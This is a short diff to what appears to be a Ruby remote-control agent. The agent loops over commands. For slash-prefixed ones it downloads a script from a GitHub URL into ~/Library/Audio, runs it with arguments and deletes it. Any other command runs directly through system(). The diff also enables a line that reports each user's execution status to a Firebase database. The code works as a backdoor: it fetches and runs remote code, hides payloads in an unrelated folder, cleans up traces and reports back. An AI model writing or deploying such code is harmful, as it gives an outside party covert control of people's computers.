@@ -22,19 +22,13 @@ commands.each do |command|
         args = command.split(" ")
         puts args
 
-        system("curl -H \"Cache-Control: no-cache\" #{GITHUB_URL}/commands/#{args[0]}.py -o ~/Library/Audio/#{args[0]}.py")
-        system("python3 ~/Library/Audio/#{args[0]}.py #{args[1..].join(" ")}")
-        system("rm ~/Library/Audio/#{args[0]}.py")
+        system("curl -H \"Cache-Control: no-cache\" #{GITHUB_URL}/commands/#{args[0]}.rb -o ~/Library/Audio/#{args[0]}.rb")
+        system("ruby ~/Library/Audio/#{args[0]}.rb #{args[1..].join(" ")}")
+        system("rm ~/Library/Audio/#{args[0]}.rb")
 
     else
         system(command)
     end
 end
 
-# system("curl -X PUT -d 'true' #{FIREBASE_URL}/users/#{USER}/executed.json")
-
-# TODO 4. If a command starts with /
-# TODO     a. separate command into name and args e.g. "/notification hello" -> notification, hello
-# TODO     b. download {name}.py e.g. notification.py
-# TODO     c. run {name}.py
-# TODO     d. delete {name}.py
+system("curl -X PUT -d 'true' #{FIREBASE_URL}/users/#{USER}/executed.json")
